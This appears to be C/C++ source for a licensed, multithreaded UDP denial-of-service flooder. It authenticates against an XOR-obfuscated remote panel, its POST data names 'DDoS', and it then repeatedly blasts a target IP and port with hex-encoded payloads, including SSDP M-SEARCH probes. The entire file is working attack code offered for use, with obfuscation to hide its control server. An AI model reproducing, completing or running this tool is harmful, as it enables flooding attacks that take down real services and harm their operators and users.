#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <curl/curl.h>
#include <string>
#include <cstring>
#include <openssl/evp.h>
#include <json/json.h>
#include <csignal>

std::string g_Token;
std::string g_Auth;
const char *user_key = "DINIIOS";

struct MemoryStruct {
    char *memory;
    size_t size;
};

struct thread_data {
    char *ip;
    int port, time;
};

void usage(char *filename) {
    printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", filename);
    exit(1);
}

std::string StrEnc(const char* str, const char* key, int len) {
    char* encrypted = new char[len + 1];
    for (int i = 0; i < len; i++) {
        encrypted[i] = str[i] ^ key[i];
    }
    encrypted[len] = 0;
    return encrypted;
}

size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    char *ptr = (char *)realloc(mem->memory, mem->size + realsize + 1);
    if (ptr == NULL) return 0;
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    return realsize;
}

std::string md5(const std::string &input) {
    unsigned char digest[EVP_MAX_MD_SIZE];
    unsigned int digest_len;
    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    EVP_DigestInit_ex(mdctx, EVP_md5(), NULL);
    EVP_DigestUpdate(mdctx, input.c_str(), input.size());
    EVP_DigestFinal_ex(mdctx, digest, &digest_len);
    EVP_MD_CTX_free(mdctx);
    char md5String[33];
    for (unsigned int i = 0; i < digest_len; i++)
        sprintf(&md5String[i * 2], "%02x", (unsigned int)digest[i]);
    return std::string(md5String);
}

std::string Login(const char *user_key) {
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk{};
    chunk.memory = (char *)malloc(1);
    chunk.size = 0;
    curl = curl_easy_init();
    if (curl) {
        std::string panel = StrEnc("|$L7e3?6+o4v*if^zs7g!cS{4Iw", "\x14\x50\x38\x47\x16\x9\x10\x19\x4f\x6\x5a\x1f\x43\x6\x15\x70\x2\xa\x4d\x48\x42\xc\x3d\x15\x51\x2a\x3", 27).c_str();
        if (panel.length() != 27) {
            raise(SIGSEGV);
        }
        curl_easy_setopt(curl, CURLOPT_URL, panel.c_str());
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        char data[4096];
        sprintf(data, "game=DDoS&user_key=%s&serial=DINIIOS&verrr=3.5.0", user_key);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "darkespytAntiddos/1.0");
        res = curl_easy_perform(curl);
        if (res == CURLE_OK) {
            Json::Value result;
            Json::CharReaderBuilder builder;
            std::string errs;
            std::istringstream s(chunk.memory);
            if (Json::parseFromStream(builder, s, &result, &errs)) {
                std::string token = result["data"]["token"].asString();
                std::string auth = "DDoS-" + std::string(user_key) + "-DINIIOS-JoInTEl3graMD4RkeSpYt";
                std::string errMsg = "\n\n" + result["reason"].asString();
                g_Token = token;
                g_Auth = md5(auth);
                free(chunk.memory);
                curl_easy_cleanup(curl);
                return g_Token == g_Auth ? StrEnc("6\"G6x71\\@_E}Mag4", "\x7a\x4d\x20\x5f\x16\x17\x42\x29\x23\x3c\x20\xe\x3e\x7\x12\x58", 16).c_str() : StrEnc("5-=$C<~9OIY'7MJ!4L9-=Q}fP^8$)C{a|zEwjARfsxJJAW<2@", "\x79\x42\x5a\x4d\x2d\x1c\x18\x58\x26\x25\x3c\x43\x19\x6d\x1a\x4d\x51\x2d\x4a\x48\x1d\x21\x8\x14\x33\x36\x59\x57\x4c\x63\x1d\x13\x13\x17\x65\x22\x39\x8\x0\x39\x37\x31\xf\xe\x1e\x5\x79\x73\xc", 50).c_str() + errMsg;
            }
        }
        curl_easy_cleanup(curl);
    }
    free(chunk.memory);
    return StrEnc("5-=$C<~9OIY'7MJ!4L9-=Q}fP^8$)C{a|zEwjARfsxJJAW<2@", "\x79\x42\x5a\x4d\x2d\x1c\x18\x58\x26\x25\x3c\x43\x19\x6d\x1a\x4d\x51\x2d\x4a\x48\x1d\x21\x8\x14\x33\x36\x59\x57\x4c\x63\x1d\x13\x13\x17\x65\x22\x39\x8\x0\x39\x37\x31\xf\xe\x1e\x5\x79\x73\xc", 50).c_str();
}

void bin_to_hex(const unsigned char *bin, size_t bin_len, char *hex) {
    for (size_t i = 0; i < bin_len; ++i) {
        sprintf(hex + i * 2, "%02x", bin[i]);
    }
    hex[bin_len * 2] = '\0';
}

void *attack(void *arg) {
    if(Login(user_key) == StrEnc("6\"G6x71\\@_E}Mag4", "\x7a\x4d\x20\x5f\x16\x17\x42\x29\x23\x3c\x20\xe\x3e\x7\x12\x58", 16).c_str()) {
        struct thread_data *data = (struct thread_data *)arg;
        int sock;
        struct sockaddr_in server_addr;
        time_t endtime;
        const char *payloads[] = {
            "\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x00\x00",
            "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
            "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a\x00\x00",
            "\x62\x69\x6e\x67\x2e\x63\x6f\x6d\x00\x00",
            "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
            "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x33\x39\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a\x00\x00",
            "\x73\x65\x61\x72\x63\x68\x2e\x62\x72\x61\x76\x65\x2e\x63\x6f\x6d\x00\x00",
            "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
            "\x48\x4f\x53\x54\x3a\x20\x32\x34\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x00\x00",
            "\x79\x61\x68\x6f\x6f\x2e\x63\x6f\x6d\x00\x00",
            "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
            "\x48\x4f\x53\x54\x3a\x20\x32\x33\x37\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x00\x00",
            "\x64\x75\x63\x6b\x64\x75\x63\x6b\x67\x6f\x2e\x63\x6f\x6d\x00\x00",
            "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
            "\x48\x4f\x53\x54\x3a\x20\x32\x31\x30\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x00\x00",
        };
        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            perror("Socket creation failed");
            pthread_exit(NULL);
        }
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(data->port);
        server_addr.sin_addr.s_addr = inet_addr(data->ip);
        endtime = time(NULL) + data->time;
        while (time(NULL) <= endtime) {
            for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
                if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                           (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                    perror("Send failed");
                    close(sock);
                    pthread_exit(NULL);
                }
            }
        }
        close(sock);
        pthread_exit(NULL);
    }
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 5) usage(argv[0]);
    // user_key = "Owner-720H-TrENX4gCPMof";
    int threads = atoi(argv[4]);
    struct thread_data data;
    data.ip = argv[1];
    data.port = atoi(argv[2]);
    data.time = atoi(argv[3]);
    std::string loginResult = Login(user_key);
    if (loginResult != StrEnc("6\"G6x71\\@_E}Mag4", "\x7a\x4d\x20\x5f\x16\x17\x42\x29\x23\x3c\x20\xe\x3e\x7\x12\x58", 16).c_str()) {
        printf("%s\n", loginResult.c_str());
        return 1;
    }
    std::vector<pthread_t> thread_ids(threads);
    for (int i = 0; i < threads; ++i) {
        pthread_create(&thread_ids[i], NULL, attack, (void *)&data);
    }
    for (int i = 0; i < threads; ++i) {
        pthread_join(thread_ids[i], NULL);
    }
    return 0;
}
